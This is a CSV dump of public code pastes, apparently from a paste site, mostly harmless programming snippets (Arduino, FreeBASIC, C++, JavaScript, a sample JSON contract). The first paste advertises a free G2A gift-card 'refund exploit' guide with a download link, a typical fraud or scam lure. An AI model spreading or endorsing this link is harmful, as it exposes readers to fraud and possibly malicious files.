id,title,username,language,date,content
bTazyZup,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Friday 1st of March 2024 11:47:40 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_737864.pdf

Working as of:
01 March 2024"
VyufiarZ,get-contract,jgeorget,CSS,Friday 1st of March 2024 11:47:34 AM CDT,"{
	""travel"": {
		""departure_country"": ""FRA"",
		""first_travel_country"": ""USA"",
		""departure_date"": ""2024-04-01"",
		""return_date"": ""2024-05-01"",
		""number_of_beneficiaries"": 2
	},
	""purchases"": [
		{
			""product"": {
				""type"": ""insurance"",
				""name"": ""ISA Premium plan""
			},
			""price"": 42,
			""currency"": ""USD"",
			""quantity"": 1
		}
	],
	""customer"": {
		""firstname"": ""Jack"",
		""lastname"": ""Dawson"",
		""address"": ""Chippewa Falls, Wisconsin"",
		""country_of_residence"": ""USA"",
		""phone"": ""1-234-45678"",
		""email"": ""jack.dawson@white-star-line.tld"",
		""alternate_email"": ""jack.dawson@tmail.tld"",
		""birthdate"": ""1992-04-10"",
		""lang"": ""en""
	},
	""beneficiaries"": [
		{
			""firstname"": ""Jack"",
			""lastname"": ""Dawson"",
			""passport_number"": ""U123456789"",
			""nationality"": ""USA"",
			""birthdate"": ""1992-04-10""
		},
		{
			""firstname"": ""Rose"",
			""lastname"": ""DeWitt Bukater"",
			""passport_number"": ""U234567890"",
			""nationality"": ""USA"",
			""birthdate"": ""1995-10-04""
		}
	],
	""payment"": {
		""status"": ""paid"",
		""transaction_id"": ""123456789etc"",
		""nb_product"": 1,
		""total"": 42,
		""currency"": ""USD""
	},
	""callback"": ""https://webhook.trip.com/insurte/01234567-89ab-cdef-1234-567890abcdef""
}"
k5dbNjLE,Control Motor PAP nema 11 con A4988,AntonioVillanueva,Arduino,Friday 1st of March 2024 11:29:30 AM CDT,"/*        Control MOTOR NEMA 11 con A4988 y Arduino
 *                Antonio Villanueva Segura
 *                          A4988
 *                    /ENABLE    VMOT +8V
 *                    MS1       GND GND
 *                    MS2       2B   AZUL (NEMA 11)
 *                    MS3       2A   ROJO (NEMA 11)
 *     cable a SLEEP  RESET     1A   NEGRO (NEMA 11)
 *     cable a RESET  SLEEP     1B   VERDE (NEMA 11)
 *    (PIN 2 ARDUINO )STEP      VDD +5V_ARDUINO 
 *    (PIN 5 ARDUINO) DIR       GND GND GND_ARDUINO
 */
/**************************************************************************************************************/
//Definiciones de PINs en el ARDUINO uno
#define EN 8 /* Habilita A4988 */
#define DIR 5 /* Sentido de giro */
#define STEP 2 /* Pasos */
/**************************************************************************************************************/
//Variables globales
float angulo(-1); //Seleccion
int pasos(0);
/**************************************************************************************************************/
void setup()//Configuracion 
{
  Serial.begin(9600);//Velocidad puerto serie

  pinMode(EN, OUTPUT);//PIN ENABLE como salida
  pinMode(DIR, OUTPUT);//DIR como salida
  pinMode(STEP, OUTPUT);//STEP como salida
  digitalWrite(EN, HIGH); //Ponemos a nivel bajo ENABLE , habilita A4988
}
/**************************************************************************************************************/
void sentidoGiro(boolean sentido){//Sentido de giro
    digitalWrite(DIR, sentido);
}
/**************************************************************************************************************/
void unPaso(){//Un paso
  digitalWrite(EN, LOW); //LOW a4988 activo
  
  digitalWrite(STEP, HIGH);//Crea el paso
  delay(1);
  digitalWrite(STEP, LOW);
  delay(1);  
}
/**************************************************************************************************************/
//Traduce el Angulo a una secuencia de pasos 
int AnguloPasos(float angulo_new){//Paso entero
  int mult(1); 
  return (abs (angulo_new) / 1.8)*mult;
}
/**************************************************************************************************************/
//Lee una cadena de texto del puerto serie
String leeCadena(){
  String cadena="""";
  if (Serial.available()) {cadena = Serial.readStringUntil('\n');}
  return cadena;
}
/**************************************************************************************************************/
//Menu lectura Serie, devuelve un int valor de Angulo
float menu(){
  Serial.print (""Angulo :"");
  String lectura="""";
  while (lectura== """" ){lectura=leeCadena();}//Espera un valor numerico dee grados
  Serial.println (lectura);//Muestra el numero de pasos 
  return lectura.toFloat();
}
/**************************************************************************************************************/
/**************************************************************************************************************/
/**************************************************************************************************************/
void loop()//Bucle principal ARDUINO
{

  angulo = menu();//Muestra mensaje y espera un Angulo
  pasos=AnguloPasos(angulo);//Traduce el angulo a numero de pasos 

  sentidoGiro (angulo ? true :false);//Selecciona sentido angulo + o -
  
  while (pasos--){unPaso();}//Ejecuta el numero de pasos

}"
uMRRtYuv,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 11:24:49 AM CDT,"type filestruct
  path as zstring*256
  file as zstring*64
  ext as zstring*4
end type

function f_ret_filestruct ( s as string ) as filestruct
  var iLen = len(s)
  return type<filestruct>( _
    left(s, instrrev(s, ""\"", iLen)), _
    mid(s, 1 + instrrev(s, ""\"", iLen)), _
    mid(s, 1 + instrrev(s, ""."",iLen)) _
  )
end function

var t = f_ret_filestruct(""c:\hello\file.txt"")
print t.path
print t.file
print t.ext
sleep

"
X0HBUUCw,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 11:07:53 AM CDT,"push 30
push 20
push 10
mov dword ptr [ebp-16], 0
mov dword ptr [ebp-12], 0
mov dword ptr [ebp-8], 0
lea eax, [ebp-16]
push eax
call _WHATEVER@12
"
h67MrNKd,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:58:57 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n;
    cin >> n;
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    
    double sum = 0.0;
    for(int i = 0; i < n; i++) {
        sum += niza[i];
    }
    sum /= n;
    double najbliska_razlika = 2000000000;
    int kukja;
    
    for(int i = 0; i < n; i++) {
        if(fabs(sum - niza[i]) < najbliska_razlika) {
            najbliska_razlika = fabs(sum - niza[i]);
            kukja = niza[i];
        }
    }
    cout << kukja << endl;
    return 0;
}

"
8ML7nz5M,Untitled,Mysoft,C,Friday 1st of March 2024 10:51:34 AM CDT,"struct $5CHECK __stdcall WHATEVER( int32 A$1, int32 B$1, int32 C$1 )
{
	struct $5CHECK fb$result$1;
	__builtin_memset( &fb$result$1, 0, 12 );
	label$2:;
	*(int32*)&fb$result$1 = A$1;
	*(int32*)((uint8*)&fb$result$1 + 4) = B$1;
	*(int32*)((uint8*)&fb$result$1 + 8) = C$1;
	goto label$3;
	label$3:;
	return fb$result$1;
}

__attribute__(( constructor )) static void fb_ctor__chk( void )
{
	label$0:;
	struct $5CHECK TTEMP$0;
	struct $5CHECK vr$0 = WHATEVER( 10, 20, 30 );
"
dL3TVPcn,Untitled,Mysoft,FreeBasic,Friday 1st of March 2024 10:48:57 AM CDT,"type Check
  as long A,B,C
end type   
function Whatever(A as long,B as long,C as long) as Check  
  return type<Check>(A,B,C)   
 end function

var tTemp = Whatever(10,20,30)
print tTemp.A
print tTemp.B
print tTemp.C

sleep
"
qB9zheLq,Party Time,drak138,JavaScript,Friday 1st of March 2024 10:47:07 AM CDT,"function partyTime(arr){
    let guests={}
    let command=arr.shift()
// Изкарвам хората които са в чакалнята за партито
    while(command!==""PARTY""){
        guests[command]=command
        command=arr.shift()
    }
// Отделям местата които са резервирани
    let reservations=arr

// Проверявам дали човекът има резервация ако има той се изкарва от чакалнята
    reservations.forEach(savedSeat => {
        if(guests.hasOwnProperty(savedSeat)){
            delete guests[savedSeat]
        }
    });

    guests=Object.entries(guests)

// Сортирам хората които са останали в чакалнята и нямат резервирани места
    let sortedGuests=guests.sort()
// Откирам колко хора не са на партито
    let guestCount=guests.length
    console.log(guestCount)
// Принтирам хората които не са на партито
    sortedGuests.forEach(guestInfo=>{
        let guestNumber=guestInfo[1]
        console.log(guestNumber)
    })
}
partyTime(['tSzE5t0p',
'9NoBUajQ',
'Ce8vwPmE',
'SVQXQCbc',
'7IK9Yo0h',
'PARTY',
'9NoBUajQ',
'Ce8vwPmE',
'SVQXQCbc'
])"
jEWJ3h9W,Untitled,Josif_tepe,C++,Friday 1st of March 2024 10:43:58 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n;
    cin >> n;
    
    int niza[n];
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
    }
    
    int zbir = 0;
    for(int i = 0; i < n; i++) {
        zbir += niza[i];
    }
    cout << zbir << endl;
    return 0;
}

"
